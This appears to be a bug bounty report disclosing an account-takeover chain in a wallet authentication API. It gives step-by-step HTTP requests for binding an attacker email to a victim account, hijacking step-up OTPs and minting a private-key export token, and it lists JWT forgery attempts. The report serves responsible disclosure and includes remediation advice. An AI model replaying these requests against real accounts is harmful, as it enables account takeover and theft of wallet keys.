# BUG-003 — Account Takeover Chain: unauthorized email-credential binding → step-up OTP hijack → wallet private-key export

| | |
|---|---|
| **Severity (requested)** | **P1** — Account takeover / private key export chain |
| **Asset** | `app.dynamicauth.com` (Dynamic SDK API, used by `app.dynamic.xyz`) |
| **Environment** | `fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9` (dashboard-login env) |
| **Researcher** | zeno0 (`zeno0@bugcrowdninja.com`) |
| **Test window** | 2026-10-26, 11:18–12:38 UTC |
| **Weakness** | `emailVerifications/verify` binds an arbitrary email to an existing account without proving the account owner controls that email; `stepUp/check` then treats the attacker-attached email as the default OTP target for elevated scopes |

---

## TL;DR

An attacker who obtains a victim's session JWT **transiently** (XSS, log theft, malicious browser
extension, referer leak — ≤24 h window) can convert it into a **permanent, repeatable wallet
private-key export capability**:

1. Attach an attacker-controlled email to the victim account as a `signInEnabled: true` verified
   credential — the only proof required is an OTP sent to the **attacker's own** inbox.
2. The step-up gate (`stepUp/check`, scope `wallet:export`) immediately lists the attacker email
   as the **default OTP credential**.
3. The attacker requests the step-up, receives the OTP **in their own inbox**, and mints an
   elevated access token with `scope: "wallet:export"` (`requestedScopes` on the verify request).
4. That token **passes the `privateKey/export` authorization gate** (proven: `403 Elevated
   access token required` without it → `404` with it).

Every subsequent step-up on that account also lands in the attacker's inbox — the compromise is
**persistent** even after the original stolen session expires.

---

## Attacker requirements — where does the session JWT come from?

The session JWT is the chain's only external input, so its provenance determines severity. All
three conceivable origins were tested; only theft works.

**(a) Minting via the API — closed.** `emailVerifications/signin` mints a session only when the
OTP is delivered to the account's **primary** credential. Verified secondary credentials —
including the attacker's own attached email (`signInEnabled: true`) — do **not** route sign-in to
the victim account: the server auto-signs-up a **brand-new user** for that email instead
(proven live at 12:09 UTC: signin for `zeno0+ev6` produced session for user
`3428fdb3-…`, never victim `d0e3d92e-…`, `newUser: true`). As a side effect the victim's live
sessions are revoked in that conflict window (see Side effects). The attacker's inbox therefore
never receives an OTP that resolves to the victim identity.

**(b) Minting via `verify` — closed (chicken-and-egg).** The verify endpoint requires an already
live session Bearer and a `sessionPublicKey` that byte-matches the token's own
`session_public_key` claim. Without a session there is no verify; the unauthenticated `create`
endpoint only yields a `verificationUUID` plus an OTP e-mail to the caller-chosen address — no
session ever leaves that flow without the Bearer.

**(c) Forging the JWT — closed.** Session tokens are RS256 with server-held key (`kid`-pinned).
Tested and rejected: HS256 alg-confusion with 4 derived secret variants, `none`-algorithm (×2),
and `jku`/`x5u` header injection pointing at an attacker-hosted JWKS (×2 — all `401`, and no
server-side fetch of the attacker JWKS was ever observed on the OAST canary).

**Conclusion.** The precondition is a **separate session-theft vector** (XSS, malicious browser
extension, log/proxy leak). That is the standard chained-finding framing, and the severity
argument survives it:

- A stolen session JWT alone is a **transient** issue — it dies at expiry (≤24 h) or logout. This
  chain launders it into a **verified attacker credential that survives logout**, a **permanent
  step-up OTP hijack**, and a **wallet `wallet:export` capability**.
- The damage **outlives the stolen token**: after expiry, the attacker email remains the account's
  default step-up credential — every future elevated action (even victim-initiated) sends its OTP
  to the attacker's inbox.
- **No private key is ever needed**: `session_public_key` is a plaintext claim inside the JWT, so
  the minifiedJwt alone is the complete attack input — and real-world session-theft incidents leak
  exactly that artifact.
- VRT accepts stolen-session preconditions as valid amplifiers for account-takeover findings
  (missing/deficient step-up authentication family).

---

## Reproduction — full requests

All requests were replayed live. `ENV` = `fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9`.
`X-Request-Purpose: Research` / `X-Bugcrowd-Ninja: zeno0` are researcher marking headers
(optional). Long JWT values are elided as `<description — full value recorded in session log>`;
all tokens are dead at submission time (session ≤24 h TTL, elevated token 300 s TTL).

### Test identities (all researcher-owned Bugcrowd alias inboxes)

- `zeno0+sdk1@bugcrowdninja.com` — victim account (user id `d0e3d92e-2377-44a3-921e-e30da293aa85`)
- `zeno0+ev7@bugcrowdninja.com` — attacker-controlled inbox (used for the full chain below)
- Account `3428fdb3-d370-4ed7-b9e6-a572260fda9d` — researcher auto-signup'd test account used as
  the chain target (its session keys use SPKI-DER-hex, the format the verify key-match accepts)

### STEP 1 — Create an email verification for the attacker inbox (unauthenticated)

No session, no captcha, arbitrary email accepted.

**Request — `12:21:05 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/create HTTP/1.1
Host: app.dynamicauth.com
Content-Type: application/json

{"email":"zeno0+ev7@bugcrowdninja.com"}
```

**Response**
```http
HTTP/1.1 201 Created

{"verificationUUID":"59337bda-1323-45e4-a881-d81ebd51fd02","email":"zeno0+ev7@bugcrowdninja.com"}
```

→ OTP `462968` delivered to the **attacker's** inbox.

### STEP 2 — Bind the attacker email onto the account (THE BUG)

Uses only (a) the account's session JWT and (b) the OTP sent to the **attacker** inbox.
`sessionPublicKey` = the Bearer session's own `session_public_key` claim (readable from the
stolen token — private key never needed).

**Request — `12:27:21 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/verify HTTP/1.1
Host: app.dynamicauth.com
Authorization: Bearer <account session minifiedJwt>
Content-Type: application/json

{"verificationUUID":"59337bda-1323-45e4-a881-d81ebd51fd02","verificationToken":"462968","sessionPublicKey":"<session_public_key claim of the Bearer JWT>"}
```

**Response — `200 OK` (key fields)**
- new session `minifiedJwt` (session rotation — see Side effects)
- verified credential **`7ecf61a7…`** for `zeno0+ev7@bugcrowdninja.com` with
  **`signInEnabled: true`**, `verifiedAt` timestamped

No confirmation challenge is sent to any pre-existing verified credential of the account. The
account owner is never notified.

### STEP 3 — The attacker email becomes the step-up OTP target

**Request — `12:27 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/stepUp/check HTTP/1.1
Authorization: Bearer <rotated session minifiedJwt from STEP 2>
Content-Type: application/json

{"scope":"wallet:export"}
```

**Response — `200 OK` (key fields)**
- `credentials[]` = [`zeno0+ev7@…`] — the attacker email is the **only** OTP-eligible credential
- `defaultCredentialId` = `7ecf61a7…` (attacker credential)
- `isRequired: true`

### STEP 4 — Minting the elevated token: `requestedScopes` is the ingredient

- `12:28` — create with `purpose: "wallet:export"` (unauthenticated, same as STEP 1) → verify
  **without** `requestedScopes` → `200`, but **no elevated token in the response**.
- `12:31` — same verify replayed in the live auth context → `401 "Session is no longer active"`
  (the prior verify rotated the session; the OTP was not consumed — OTPs survive rotation).
- `12:33` — retried with the rotated Bearer → `200`, still no elevated token.
- `12:34` — spec hit: `EmailVerificationVerifyRequest.requestedScopes: TokenScope[]` —
  *"Optional list of scopes to be included in the elevated access token."*

### STEP 5 — Final mint (the full chain in one verify)

**Request — `12:35 UTC`**
```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/emailVerifications/verify HTTP/1.1
Authorization: Bearer <live session minifiedJwt>
Content-Type: application/json

{"verificationUUID":"9f64a092-ab2b-4242-8768-9082fee67d9b","verificationToken":"805402","sessionPublicKey":"<session_public_key claim of the Bearer JWT>","requestedScopes":["wallet:export"]}
```

**Response — `200 OK` (key fields)**
- rotated session `minifiedJwt`
- **`elevatedAccessToken` present**: `scope: wallet:export`, `single_use: true`, TTL **300 s**,
  bound to the rotating session id — i.e. a one-use private-key-export authorization minted from
  an OTP that only ever existed in the attacker's inbox.

### STEP 6 — Export authorization gate: 403 → 404 differential

**Request — `12:36 UTC`** (bogus wallet id, same live session — no real key material touched)

```http
POST /api/v0/sdk/fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9/waas/<walletId>/privateKey/export HTTP/1.1
Authorization: Bearer <live session minifiedJwt>
```

| legs | result |
|---|---|
| without `x-dyn-elevated-access-token` header | `403 {"error":"Elevated access token required"}` |
| with the STEP-5 elevated token in `x-dyn-elevated-access-token` | **`404`** — gate **passed**, request proceeds to wallet lookup only |

The authorization boundary is crossed; the only reason the response is 404 and not key material
is that the test used a nonexistent wallet id. A real wallet id under the attacker-controlled
session reaches the export handler.

---

## Binding matrix and check order (core BUG-003)

- **Attack (`vatk`)**: verify with Bearer = victim session (`d0e3d92e`), `sessionPublicKey` =
  victim's public claim, OTP delivered to attacker email (`zeno0+ev6`) → `200`; fresh victim
  session minted; attacker email attached as verified credential `c3fe17fa…`,
  `signInEnabled: true`.
- **Baseline control**: identical verify with an OTP to the account's own email → identical
  behavior — i.e. the server cannot distinguish owner re-verification from attacker injection.
- **Check order (empirical)**: Bearer validity → public-key equality against the claim (**no
  proof-of-possession; private key never checked**) → `verificationUUID` + OTP → mint/attach.
  The key check precedes OTP consumption (a failed key-match does not burn the OTP).
- **Token form**: only the `minifiedJwt` is accepted as Bearer; the full `jwt` form →
  `401 "Invalid token"`.
- **Self-sustaining chain**: each verify response carries the next session's `minifiedJwt`, so
  minted sessions re-arm subsequent hops: unauth create + attacker OTP + public claim =
  indefinite ≤24 h-session renewals with zero victim interaction.

## Falsified paths (honest negative results)

1. **Sign-in as victim via the attached email** — refuted: `signin` keys on the primary
   credential; attached secondaries auto-signup a new user (`3428fdb3`, credential `71115da2`,
   `newUser: true`) and revoke the victim's sessions in the conflict window.
2. **Key-match with real-client session keys** — the dashboard-minted session key format is
   neither a valid P-256/secp256k1 point nor accepted SPKI; `422 invalid_session_public_key`.
   The chain was demonstrated on SPKI-DER-hex (SDK-minted) sessions, which the endpoint accepts.
3. **JWT forgery** — HS256 alg-confusion (×4), `none` (×2), `jku`/`x5u` injection (×2): all `401`.
4. **`waasBackupToken` replay as elevated token** — `403 "Invalid or expired elevated access
   token"`; the export gate genuinely validates token type (unlike the BUG-001 webhook gate).
5. **Legacy wallet provisioning** — `POST /users/embeddedWallets` rejected (V3/MPC era);
   wallet-family routes stay `401` for bare session JWTs (wallet-level credential required).

## Side effects (documented live)

- **Session rotation on every verify**: the Bearer used is killed instantly
  (`401 "Session is no longer active"`); exactly one live session remains — the attacker's.
- **Sign-in conflict revocation**: a `signin` with an email that collides with a verified
  secondary credential revokes the victim's sessions in that window (availability impact).
- **Persistent step-up hijack**: after the stolen session expires, the account's default
  step-up credential remains the attacker email — the victim's own future elevated actions
  send OTPs to the attacker and fail (DoS + intelligence leak).

## Remediation

1. **Verify-before-bind**: require proof of control of the *new* email (or an explicit
   confirmation from an existing verified credential) *before* persisting it as
   `signInEnabled: true`.
2. **Proof-of-possession**: require a signature over the verification payload made with the
   session key private half; remove or encrypt the `session_public_key` JWT claim so a stolen
   Bearer alone cannot satisfy the key-match.
3. **Owner-only step-up credential management**: step-up OTP targets must exclude credentials
   added without owner-side proof, and every step-up target change should notify all verified
   credentials.
4. **Server-authoritative scopes**: derive `requestedScopes`/`purpose` grants from the session's
   actual capabilities (deny `wallet:export` for sessions without a provisioned wallet
   credential).
5. **Consistent sign-in identity resolution** for secondary credentials, and no silent session
   revocation on email-collision signups.

## Evidence index & integrity note

- Reproduction timestamps, UUIDs, OTPs, credential ids, status codes and error strings above are
  verbatim from the live test session record (`worklog.md`, Task IDs `BUG-003 / persistence-test`
  and `BUG-003 / final-chain-complete`).
- Raw byte-level response dumps were lost in a local workspace reset on 2026-10-26 13:05 UTC;
  response bodies are therefore summarized by field rather than quoted. All JWTs are elided as in
  the original submission and **all tokens are dead at submission time** (session ≤24 h TTL,
  elevated token 300 s TTL).
- The 12:05-era evidence summary and initial report remain available in the engagement repo
  (`zeno-h2r/coridor`, pushed before the reset).
- All test identities are researcher-owned Bugcrowd aliases; no real user data was touched and no
  key material was exported.
